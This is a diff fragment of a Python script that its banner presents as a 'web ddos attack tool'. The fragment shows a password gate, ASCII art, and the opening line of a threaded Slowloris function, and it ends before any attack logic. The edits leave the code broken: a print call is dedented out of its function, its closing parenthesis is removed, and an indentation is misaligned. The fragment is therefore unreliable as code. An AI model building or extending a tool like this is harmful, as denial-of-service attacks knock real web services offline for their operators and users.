@@ -3,31 +3,27 @@ import threading
 import time
 import getpass
 import os
-
 # CLEAR
 def clear():
     os.system('clear')
 
 # Colored ASCII Art for "ZhanAhmad" using '|_' style
 def ascii_art_adirtta():
-    print("""
-\033[1;31m      ______  ___   ______   ______\033[0m
+print("""
+\033[1;31m      ______  ___   ______   ______   \033[0m
 \033[1;31m     /  /\  \/   | / ____/  / ____/   |\033[0m
 \033[1;36m    /  /_/__/ /| | \ \___  / /__   💀 code by zhanahmad 💀\033[0m
 \033[1;35m   / ___  \/ ___ | ____\ \/ ___/_   THANK YOU FOR USING MY TOOL 😎>\033[0m
 \033[1;32m  /_______/_/  |_//_____//______/  
 \033[1;34m      A web ddos attack tool. So do not use it for wrong and unethical activities\033[0m
-""")
-
-
+"""
 # Password authentication function
 def authenticate():
-    password = "ADi"  # The password to access the tool
+ password = "ADi"  # The password to access the tool
     user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
     if user_password != password:
         print("\033[1;31mIncorrect password. Exiting...\033[0m")
         exit()
-
 
 # Optimized Slowloris function with threading for faster execution
 def slowloris_thread(target, port):
